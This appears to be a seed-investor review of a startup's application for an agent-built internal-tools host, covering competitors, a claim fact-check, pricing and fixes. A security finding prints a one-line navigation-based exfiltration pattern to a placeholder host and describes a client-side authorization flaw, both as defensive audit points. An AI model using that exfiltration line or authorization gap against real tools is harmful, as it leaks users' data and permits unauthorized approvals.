# Investor review, round 1 (devtools and infrastructure seed lens)

Reviewer persona: partner at a seed/Series A fund with investments in developer platforms and internal-tools companies. Date of review: 2026-10-04.

## Score

**6.0 / 10**

## Secondary odds

About **3%** acceptance if submitted today as-is, with zero users, by an unknown solo founder. That is roughly 2x the base rate. The fit to a live RFS and a working, security-literate product help. Zero users, a solo founder and a competitive picture that has moved under the package's feet hurt.

## Verdict

The product is real, the writing is clear and honest, and the RFS fit is as direct as it gets. But the core claim, that Hangar is the only *neutral, governed* place for agent-built tools because every builder platform is "structurally unable" to own it, was overtaken by events in the last 120 days. Retool shipped a CLI on September 24, 2026 that deploys apps built in Lovable, Cursor and Replit into its governed runtime. Superblocks imports Claude, Replit, Lovable, v0 and Bolt apps. OpenAI launched Codex Sites on June 2 (internal full-stack apps behind Sign in with ChatGPT, with data and file storage). Anthropic's artifacts gained public sharing, MCP connectors at view time and a shared database with per-path access rules. Netlify went private-by-default and Vercel made production protection free. A YC partner, especially one close to Retool (a YC company), will catch this in the first two minutes. The package presents several of these competitors as they stood months ago, and it leaves out the most dangerous one (Codex Sites). On top of that, the beachhead (AI-forward startups, prospect list median 10 people) is where the pain is weakest. Today this is interview-worthy at best and most likely a rejection. The thesis is not dead. It needs to be re-derived from where the market is now, and backed by pilot data showing that companies really do deploy from more than one agent.

## What is strong

1. **RFS fit is exact.** The 50-character line, the problem story and the "share like a Google Doc" framing map cleanly onto Koomen's request. No stretching.
2. **The product exists and is thoughtfully built.** About 6,400 lines. `npm test` passes 48/48 for me. There is a zero-dependency CLI that is also an MCP server, plus versioned deploys and rollback. Deploy tokens are hashed, scoped to a team and tied to the owner's *live* role. Tool and asset tickets are per viewer and re-checked against membership on every call. Non-members get a 404. An opaque-origin CSP sandbox applies in a frame and in a direct tab, and credentials are scanned at deploy time. A 38-check browser suite backs the core claims. For a solo build in a couple of weeks, this shows real engineering taste.
3. **The security framing is a good wedge story.** "Tools never hold credentials" is easy to explain, and it is correctly rooted in the documented Lovable failures (CVE-2025-48757 and the April 2026 API exposure).
4. **Honest about traction.** No inflated numbers, a defined metric (tools opened by 2+ people in 7 days), `npm run metric` that excludes the demo team, and explicit "never fill a number you cannot show on screen" guidance. Partners reward this.
5. **Pricing instinct on viewers is right.** Free, unlimited viewers is the correct growth lever for small software.
6. **The writing is tight.** The interview prep anticipates the right questions (Anthropic, Lovable, Toolify).

## Fact check table

I checked 18 claims via web search. "Holds" means the number or fact is right as stated. "Shaky" means it is right but stale, mis-sourced or framed in a way a partner could poke holes in. "Wrong" means it is out of date or contradicted.

| # | Claim (package) | Source cited | Verdict | Note |
| --- | --- | --- | --- | --- |
| 1 | Lovable crossed $600M ARR in Sept 2026 | SaaS City, Panto | Holds | Announced Sept 24, 2026 at HumanX (TechCrunch). Cite TechCrunch, not SaaS City. |
| 2 | Lovable Business: workspace publish, custom audiences, SSO, IdP group mapping, $50/mo | docs.lovable.dev | Holds | True. Note Business is **$50/mo flat for unlimited members with SSO**, which undercuts Hangar's $40/builder SSO tier (see pricing critique). |
| 3 | Replit private deployments "now down to Core/Starter" | Replit docs | Holds | Replit changelog, May 8, 2026. The "viewer seats (50 free on Teams)" detail was not verified. Replit restructured its plans in Feb 2026 (Pro replaced the old team tier), so it is probably stale. |
| 4 | Claude Code Artifacts: one self-contained page, 16 MiB, strict CSP, launched June 2026 | claude.com blog, eesel | Shaky | Accurate for the June 18 launch, but stale now. Since July 13, 2026: multiplayer editing and **MCP connectors called each time someone views** (live data and actions). Public links exist on Free/Pro/Max and can be enabled by an Owner on Team/Enterprise. Around Sept 10, 2026: a **shared database per artifact with per-path read/write rules and per-viewer identity**. "Capabilities expanding" badly understates that Anthropic has shipped Hangar's `window.hangar` primitives *and* its connector roadmap. |
| 5 | Artifacts are "Org-only, no public option" | Anthropic | Wrong | Public sharing shipped July 13, 2026. |
| 6 | Artifacts viewers must be seat-holding members of the same Claude org | eesel | Holds | True for org-scoped shares. This is Hangar's best real gap, but it shrinks as companies roll Claude out to all staff. |
| 7 | Microsoft 365 Copilot App Builder: apps stored in SharePoint, shared like documents | Microsoft blog | Holds | Also: SharePoint Copilot Apps going GA in autumn 2026. Microsoft is moving, not standing still. |
| 8 | Vercel SAML SSO $300/mo | Vercel pricing | Holds | Still a Pro add-on at $300/mo. |
| 9 | Vercel Advanced Deployment Protection $150/mo; developer clouds "public by default" | Vercel pricing | Wrong | Since about Sept 9, 2026, Vercel Authentication protects production domains **free on every plan**, and Pro has **free unlimited Viewer seats**. Netlify made new projects **private by default on July 28, 2026**. Cloudflare offers one-click Access on Workers with an account-wide default and passes viewer identity to code. "Public by default" is no longer true for two of the three named clouds. |
| 10 | Superblocks $60M raised; 3.0 shipped Aug 2026 | Superblocks Clark post | Shaky | Both facts hold ($60M total after the May 2025 Series A; 3.0 on Aug 3, 2026). But the link is the 2024 Clark post, not 3.0. Worse, the table says Superblocks is "only for apps built inside them". That is **wrong**: Superblocks imports apps from Claude, ChatGPT, Lovable, Replit, v0, Bolt and raw code, and has a Builder MCP for Claude, Cursor and ChatGPT. |
| 11 | Retool/Superblocks "make you build inside their runtime; they compete with the agents" | none | Wrong | Retool CLI, public beta Sept 24, 2026: "securely deploy apps built with vibe-coded platforms like Lovable, Cursor, and Replit". Retool's MCP server serves Claude Code, Cursor and Codex. Retool now markets "build wherever you want... ship it through a single, governed runtime". That is Hangar's thesis, word for word, from the category incumbent. |
| 12 | InsForge $8M seed, Sept 2026 | Dealroom | Holds | Announced late Sept 2026. No investors disclosed. YC Spring 2026 (X26), as stated. |
| 13 | Val Town Feb 2026 update: 2% monthly growth vs 20% goal | blog.val.town | Shaky | Literally true but cherry-picked. The July 2026 update shows ARR +6% and Pro +26%, with a stated focus on **internal tools**. Val Town then shipped **Val Town Access** ("one-click team-only authentication for your internal tools", restrict by team or email domain). Val Town is a live competitor, not graveyard evidence. |
| 14 | Retool Build vs Buy 2026: 60% built outside IT oversight, 35% replaced SaaS, 78% expect to build more | Retool | Holds | Correct. Disclose it is n=817 *Retool customers and builders*, a vendor survey with a biased sample. |
| 15 | CVE-2025-48757: 1,645 Lovable apps scanned, ~1 in 10 exposed, CVSS 9.3; April 2026 incident exposed others' source and DB credentials | launchreadycode.com | Holds | Numbers check out (170 of 1,645 = 10.3%; CVSS 9.3). The April 20, 2026 BOLA exposure is documented by The Register and TNW (Lovable disputed it as "intentional behavior"). Swap the obscure aggregator for Matt Palmer's writeup or the NVD entry, plus The Register. |
| 16 | Anthropic 300,000+ business customers by late 2025 | Panto | Shaky | Anthropic did say this (Oct 2025), but cite Anthropic directly. It is a year old. Calling these "companies already paying for an AI that writes software" overreaches: most are API customers using Claude for anything, not coding seats. |
| 17 | Gartner sized low-code development platforms at $44.5B for 2026 | InfoWorld | Shaky | This is a **2022 forecast** for "low-code development technologies", a broad bucket (LCAP plus RPA, iPaaS, citizen automation and more). It is not a measured 2026 size of app platforms. The LCAP slice was roughly a quarter of that total. |
| 18 | ~70% of engineers use 2 to 4 AI coding tools simultaneously | Digital Applied | Shaky | The number traces to The Pragmatic Engineer's 2026 survey (900+ respondents), and some outlets mis-attribute it to JetBrains. Cite the primary source. More importantly, it measures *engineers*. The RFS's target builders are non-engineers, who usually get the one tool IT bought. So the stat does not support the neutrality inference as written. |
| 19 | Claude Code passed $2.5B run-rate in early 2026 | Sacra | Holds | Feb 2026 figure. Accurate, but say "by February 2026". Anthropic overall was reported at a $30B run-rate by July. |
| 20 | Lightcone: YC built 350+ internal agent tools; one shared database was "the key unlock" | YC on X | Holds | Correct, with a nuance that cuts against the product. The unlock was giving agents **read-only SQL access to YC's central Postgres**, which is data access. Hangar today has no data access at all (no connectors, and tools cannot call any external API). |

**Product claims I checked in the code:**

- "Tools cannot send data off Hangar" (memo, application, and the in-product banner) is **overclaimed**. `connect-src 'self'` blocks fetch and XHR, and the e2e check only tests `fetch("https://example.com/")`. But `TOOL_SANDBOX` includes `allow-popups`, and CSP has no shipped directive that blocks navigation. So a tool can very likely run `location.href = "https://x/?d=" + data` or `window.open(...)` and carry the records it shows off Hangar. I read this from `src/lib/hosting/runtime.ts` and did not confirm it in a browser.
- "A full approvals tool needs zero backend code" is **true only if you trust the client**. The records API lets any member who can run the tool `update` or `remove` *any* record, and `approvedBy` is a free-text field the client writes. A viewer can open the console and approve their own purchase request "as" a manager. Server-side `updatedById` stamping gives an audit trail, but the authorization is client-enforced. That is the same *class* of mistake as the Lovable RLS bug, contained to team members. Claude's artifact database already ships per-path write rules by sharing level.

## Competitors or risks the package missed

**Direct and recent (not in the package, or described as they stood months ago):**

1. **OpenAI ChatGPT/Codex Sites (June 2, 2026).** Codex creates, deploys and hosts full-stack internal apps with **Sign in with ChatGPT, data and file storage, workspace-internal sharing**, free during preview. Codex appears in the package only as a deploy *client*. This is the biggest omission: a lab hosting its own agent's output with a backend, which Hangar lacks.
2. **Anthropic artifacts, post-launch.** Public sharing, multiplayer, MCP connectors at view time (July), and a shared per-artifact database with access rules and per-viewer identity (Sept). Anthropic has shipped Hangar's runtime API and its roadmap item "connectors" for Claude output.
3. **Retool CLI and MCP (Sept 24, 2026).** Deploys agent-built React apps from Lovable, Cursor, Replit and Claude Code into a governed runtime. Data connections map onto resources IT already configured. Runs in cloud, VPC or on-prem. This is the "neutral governed deploy target" pitch from a YC-backed incumbent with years of enterprise connectors.
4. **Superblocks 3.0 + app imports + Builder MCP.** An IT-blessed "golden path" for vibe-coded apps from any builder, inside the customer's AWS VPC.
5. **Netlify.** Private by default (July 28, 2026). Agent Runners use Claude Code, Codex and Gemini as the builder. An "Internal Builder" role for non-engineers. An "Internal Apps" solution page with serverless functions and access controls.
6. **Vercel.** Free production protection (Sept 2026) plus free Viewer seats on Pro.
7. **Cloudflare.** "Secure all your internal vibe-coded applications in one click": Access on every Worker by account-level default, with viewer email, name and groups passed into code. Also Cloudflare OS. Access is free to 50 users.
8. **display.dev** (EUR 470K pre-seed). One-command MCP publishing of agent-generated HTML behind **Google and Microsoft SSO**, unlimited viewers, publishers not billed per seat, EUR 49/mo. It already has the Google sign-in that Hangar's sprint plan only begins in week 1. Several smaller artifact-sharing tools exist too (pagepost, markloop, send.co, peony).
9. **Val Town Access.** Team-only authentication for internal tools, restricted by domain or person. Val Town is now focused on internal tools.

**YC companies in the dataset the package missed:**

- **Modelence (S25).** Backend cloud built for coding agents (auth, DB, cron, monitoring). It runs a landing page explicitly targeting the "A Cloud for Small Software" RFS.
- **Specific (F25).** "The cloud platform built for coding agents": `specific deploy` from your agent.
- **Olive (W25).** "Build internal tools with AI."
- **Wato (X26).** "The control point for AI agents at work": shared memory, connected tools and "living artifacts" across a team.
- Older neighbors worth one line: Windmill (S22, scripts to internal apps with credentials and permissions), Reflex (W23, build, deploy and manage enterprise apps).

**Risks the package underweights:**

- **The RFS is crowded by design.** Koomen published it for Fall 2026. Expect dozens of W27 applications answering it, and partners will compare. "Neutral, governed, sandboxed" is now claimed by at least Retool, Superblocks and Cloudflare.
- **Neutrality may be a rationalization, not a buying criterion.** The non-engineers the RFS is about mostly use the one AI tool their company bought (Claude Team, ChatGPT Business, M365 Copilot), and each of those now bundles a private host. The "viewer needs a seat" gap closes when a company rolls Claude or ChatGPT out to everyone, which is the trend. The package offers no evidence that real companies deploy internal tools from two or more agents.
- **Distribution platform risk.** The agent's native "share" action (the Artifact tool in Claude Code, Sites in Codex) is built in. Hangar requires `claude mcp add` and a skill install. "Be the default share action" competes against a first-party default the lab controls.
- **Beachhead mismatch.** The memo targets 20 to 300 person AI-forward startups. The prospect CSV has a median team size of 10, and 122 of 145 companies have fewer than 20 people, including defense hardware and robotics firms. At that size engineers deploy to Vercel or Cloudflare for free, and there is no IT gate. The pain the package documents (Floracene, the Retool survey) lives in ops-heavy, non-engineering organizations.
- **Product thinness versus the field.** Static only, 3 MB, one page, no external network access, no server code, 5,000 records per tool, email and password only. Every named competitor except display.dev offers a backend, connectors or both.

## Business model and sizing critique

**Pricing is out of step with the market.**

- The market has converged on *flat* team pricing with SSO included: Lovable Business at $50/mo for unlimited members with SSO, display.dev at EUR 49/mo with Google and Microsoft SSO, Cloudflare Access free to 50 users, Vercel protection free, Codex Sites free in preview, artifacts bundled into Claude seats.
- Hangar's $40/builder/month for SSO is exactly the "SSO tax" the package criticizes Vercel for. At 15 builders it is $600/mo against a $50/mo Lovable workspace.
- Per-builder metering has a perverse incentive: "a builder is anyone with deploy rights" pushes customers to route every deploy through one or two tokens, which caps expansion and weakens the audit story.
- Better: Free; Team flat at about $49 to $99/mo up to N builders; Business at about $299 to $499/mo with Google/Microsoft SSO, audit export and connectors; usage limits on storage and records. Expansion should come from connectors and governance, not seat counting.

**ACV and motion.** $7,200/yr sold founder-led is fine for the first 20 logos. It only works at scale with self-serve and the viewer loop. The plan says this, but the pricing does not support self-serve against free alternatives.

**Defensibility.** Static hosting, a JSON store and sign-in are commodities, and switching costs are near zero (static files plus exportable JSON). The moat claims ("control plane", "the way identity consolidated in Okta") need something that compounds: connectors with brokered credentials and per-record policy, an org-wide tool registry and inventory across *all* hosts including Artifacts, Sites and Retool, or a vertical. Today none of that exists, and the labs already ship connectors.

**Market sizing is top-down and leans on soft numbers.**

- "10% of Anthropic's 300,000 business customers at $6,000/yr = $180M" has several problems. It treats API customers as coding-seat buyers. It assumes a startup reaches 10% of a lab's entire base. Its $6,000 does not match the $7,200 illustrative account. And it is one vendor's footprint, not a market.
- The $44.5B Gartner figure is a 2022 forecast of a much broader category.
- A partner will prefer a bottom-up line, for example: "N companies with 50 to 1,000 employees in the US and EU (cite Census or Eurostat), times the share with 3 or more people building with agents (measured in our pilots), times $X flat ACV." Then show one expansion vector: connectors at about $Y per connector or a governance tier.

**Market framing that would hold up.** The real prize is the governed runtime for agent-built internal software, which is the slice of the internal-tools budget moving from Retool, Power Apps and OutSystems toward agent-built code. That is large. But the incumbents capturing it are the ones the package describes as "competing with the agents". Say that, and explain why a bottom-up, free-viewer product wins the 50 to 500 person segment before they do.

## Top changes ranked by score impact

1. **Rewrite `03-competition.md`, the memo's section 6 and the application's competitor answer to match October 2026** (+0.8).
   - Add OpenAI Codex Sites. Update the Anthropic row with public sharing, MCP connectors and the shared database with access rules.
   - Correct the Retool/Superblocks row from "build inside their runtime" to "now import and deploy agent-built apps from any builder (Retool CLI, Sept 24; Superblocks imports and Builder MCP)".
   - Correct "public by default" for Netlify (private since July 28) and Vercel (free production protection since September, free viewers). Add Cloudflare one-click Access, display.dev, Val Town Access, Modelence and Specific.
   - Then restate the wedge narrowly and defensibly, for example: "the only host where a 50-person company's viewers need no vendor account or seat, nobody has to set up an IdP or cloud account, and any agent deploys with one call, for a flat price". Drop "nobody else is building that" and "structurally unable to own".
2. **Re-target the beachhead and the prospect list, then actually land pilots** (+0.8 if 5 or more real teams by Nov 2).
   - Change "AI-forward startups of 20 to 300" to non-engineering builders at 50 to 500 person, ops-heavy companies on Google Workspace (agencies, logistics, clinics, e-commerce ops, RevOps and finance teams), where IT says no today.
   - Rebuild the CSV with companies of 40 or more people that have an ops function. Drop defense, robotics and the median-10 startups.
   - Set the target to an honest "5 teams, each with a tool opened by 2+ people for 2 consecutive weeks" and hit it.
3. **Make the data API enforce authorization server-side, and fix the flagship example** (+0.4).
   - Add per-collection rules: who can create; who can update which fields (by role, or creator-only); server-stamped fields like `approvedBy` taken from the session, not the client.
   - Ship the approvals example on those rules, add e2e checks that a viewer cannot approve or delete others' records, and change "zero backend code" to "zero backend code, with server-enforced rules".
4. **Remove or fix the "cannot send data off Hangar" claim** (+0.2).
   - Drop `allow-popups` from `TOOL_SANDBOX`.
   - Add e2e probes for `location.href` and `window.open` exfiltration.
   - Reword the banner, memo and app to "cannot make network requests off Hangar or act as the viewer". A technical partner probing a security-first pitch and finding an overclaim costs more than the claim gains.
5. **Change pricing from $20/$40 per builder to flat team tiers with SSO included** (+0.3), for example Free; Team $49/mo up to 10 builders; Business $299/mo with Google/Microsoft SSO, audit export and connectors. Cite Lovable's $50 flat Business plan and display.dev's EUR 49 as the market reference, and stop charging the SSO tax the memo criticizes.
6. **Replace top-down sizing with a bottom-up line, and drop or footnote the Gartner and Anthropic-base math** (+0.3). Change "10% of 300,000 at $6,000 = $180M" to a company-count by employee-band calculation, with a measured "share of companies with 3+ agent builders" from discovery calls. Cite Anthropic's 300K directly with its date if kept.
7. **Fix the citations a partner could poke at** (+0.2).
   - Superblocks: link the 3.0 post.
   - The 70% stat: cite The Pragmatic Engineer and say "engineers".
   - CVE: Matt Palmer or NVD. April incident: The Register.
   - Lovable ARR: TechCrunch.
   - Claude Code $2.5B: "by February 2026".
   - Val Town: move it out of "graveyard" into competitors, citing July 2026 and Val Town Access.
   - Lightcone: say the unlock was data access, and use that to justify connectors.
8. **Polish the proof artifacts** (+0.1).
   - Commit the hosting work: `git log` shows 3 commits from Sept 18 to 19, and all hosting code is uncommitted.
   - Re-shoot `1-dashboard.png`, where 5 of 6 tools are "link only" and the Next.js dev indicator is visible. Lead with hosted tools.
   - Record the 2-minute demo.

## What would make this a 9.5+

- **Usage that proves the thesis, not just the product.**
  - 15 to 25 teams, of which 40% or more have a tool opened by 3+ people weekly for 3 or more consecutive weeks.
  - Median pilot deploys from **two or more different agents**. This single data point turns "neutral control plane" from a rationalization into a finding.
  - Most deploys made by non-engineers.
  - At least 3 paying teams, and one IT or ops lead on record saying "this is now where our tools must live".
- **A moat that the labs and Retool cannot ship in a sprint.**
  - Connectors with brokered credentials, per-record policy and audit, live with pilots.
  - Or an org-wide inventory and policy layer that governs tools wherever they run (Artifacts, Codex Sites, Lovable, Hangar), which makes the labs' hosting a feed into Hangar rather than a threat.
- **A competition section written from October 2026 reality** that names Codex Sites, Claude's artifact database, Retool CLI and Superblocks imports, and wins anyway on a specific axis backed by pilot data: free viewers without vendor accounts, zero admin setup, flat price, and works across agents.
- **A server-side story.** A sandboxed function runtime behind the same permission model, so the flagship tool can read the CRM or a database replica. Without it, the product is a form-and-list host, and most real internal tools need data.
- **Founder-market credibility** (excluded from this score, but decisive for a 9.5): an infra or security background, or a cofounder who has run production infrastructure.
